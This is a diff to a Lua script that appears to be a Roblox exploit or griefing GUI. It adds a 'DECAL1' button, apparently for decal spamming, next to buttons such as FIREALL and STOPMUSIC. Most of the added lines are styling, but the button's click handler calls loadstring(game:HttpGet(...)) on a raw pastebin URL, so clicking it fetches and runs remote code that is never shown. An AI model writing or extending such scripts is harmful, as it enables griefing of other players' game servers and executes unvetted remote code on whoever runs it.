@@ -23,6 +23,7 @@ local NIGHT = Instance.new("TextButton")
 local STOPMUSIC = Instance.new("TextButton")
 local FIREALL = Instance.new("TextButton")
 local DREAMYBULLXXX = Instance.new("TextButton")
+local DECALSPAM1 = Instance.new("TextButton")
 
 --Properties:
 
@@ -475,6 +476,23 @@ text1.BackgroundTransparency = 1
 text1.Parent = gui1
 wait()
 end)
+DECALSPAM1.Parent = Frame
+DECALSPAM1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+DECALSPAM1.BorderColor3 = Color3.fromRGB(196, 40, 28)
+DECALSPAM1.BorderSizePixel = 3
+DECALSPAM1.Position = UDim2.new(0.68, 0, 0.55, 0)
+DECALSPAM1.Size = UDim2.new(0, 92, 0, 30)
+DECALSPAM1.Font = Enum.Font.SourceSans
+DECALSPAM1.Text = "DECAL1"
+DECALSPAM1.TextColor3 = Color3.fromRGB(242, 243, 243)
+DECALSPAM1.TextScaled = true
+DECALSPAM1.TextSize = 14.000
+DECALSPAM1.TextWrapped = true
+DECALSPAM1.MouseButton1Down:connect(function()
+local ID = 15756728789
+loadstring(game:HttpGet("https://pastebin.com/raw/k84YCjz5"))()
+end)
+
 -- Scripts :
 
 local function QFCS_fake_script() -- Frame.Dragify 
